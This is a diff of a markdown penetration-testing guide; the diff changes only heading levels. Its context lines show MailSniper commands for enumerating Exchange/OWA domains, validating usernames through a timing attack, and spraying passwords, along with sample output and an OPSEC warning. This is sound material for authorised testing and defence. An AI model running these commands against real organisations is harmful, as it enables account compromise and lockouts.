@@ -9,7 +9,7 @@ When you install Exchange Server, Outlook on the web is automatically available 
 In this section some attacks and enumeration techniques are going to be detailed.
 
 
-# Password Spraying
+## Password Spraying
 
 Two excellent tools for password spraying againts Office 365 and Exchange are `MailSniper` and `SprayingToolkit`.
 
@@ -20,7 +20,7 @@ Two excellent tools for password spraying againts Office 365 and Exchange are `M
 Import-Module .\MailSniper.ps1
 ```
 
-## NetBIOS Enumeration
+### NetBIOS Enumeration
 
 Enumerate the NetBIOS name of the target domain.
 
@@ -28,7 +28,7 @@ Enumerate the NetBIOS name of the target domain.
 Invoke-DomainHarvestOWA -ExchHostname <IP>
 ```
 
-## Domain Hardvesting
+### Domain Hardvesting
 
 We can also bruteforce with a wordlist the OWA in order to find new domains.
 ```
@@ -71,7 +71,7 @@ Response Time (MS)       Domain\Username
 61                       www2\LjldcpFEeQ
 44                       ns3\LjldcpFEeQ
 ```
-## Finding Posible Usernames
+### Finding Posible Usernames
 
 It is common to see in organizations that usernames follow a pattern. For example:, typicall patterns are:
 
@@ -82,7 +82,7 @@ It is common to see in organizations that usernames follow a pattern. For exampl
 {f}{las}
 {last}{first}
 ```
-### Hunter.io
+#### Hunter.io
 
 Hunter.io lets you find professional email addresses with a domain in seconds and find the pattern using different hardvesting techniques.
 
@@ -90,7 +90,7 @@ Hunter.io lets you find professional email addresses with a domain in seconds an
 
 ![Hunter.io](../images/hunter.png)
 
-### Namemash.py
+#### Namemash.py
 
 `namemash.py` is a python script that transforms a list of person's full name into possible username permutations.
 
@@ -114,7 +114,7 @@ john
 joe
 ```
 
-## Validating Posible Usernames
+### Validating Posible Usernames
 
 `Invoke-UsernameHarvestOWA` uses a timing attack to validate which (if any) of these usernames are valid.
 
@@ -124,7 +124,7 @@ joe
 Invoke-UsernameHarvestOWA -ExchHostname <IP> -Domain CORP -UserList .\possible-usernames.txt -OutFile valid.txt
 ```
 
-## Spraying Passwords
+### Spraying Passwords
 
 `MailSniper` can spray passwords against Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).
 
@@ -137,7 +137,7 @@ Invoke-PasswordSprayOWA -ExchHostname <IP> -UserList <userlist.txt> -Password "C
 > **OPSEC Alert**: Be careful when making authentication attempts as we may block accounts. Furthermore, making too many attempts in a short time is very noisy.
 
 
-# Retrieving Address List
+## Retrieving Address List
 
 With credentials of a user inbox we can retrieve the whole address list.
 
